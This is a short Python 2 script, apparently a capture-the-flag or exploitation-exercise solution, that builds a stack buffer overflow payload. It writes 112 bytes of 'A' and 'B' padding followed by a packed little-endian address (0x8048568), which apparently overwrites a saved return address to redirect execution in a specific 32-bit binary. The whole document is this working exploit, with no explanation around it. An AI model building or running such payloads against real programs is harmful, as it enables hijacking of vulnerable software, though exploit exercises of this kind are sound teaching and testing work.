import struct

def pack(p):
    return struct.pack('<I', p)

payload = ""
payload += 'A' * 60
payload += 'B' * 52
payload += pack(0x8048568)

print payload
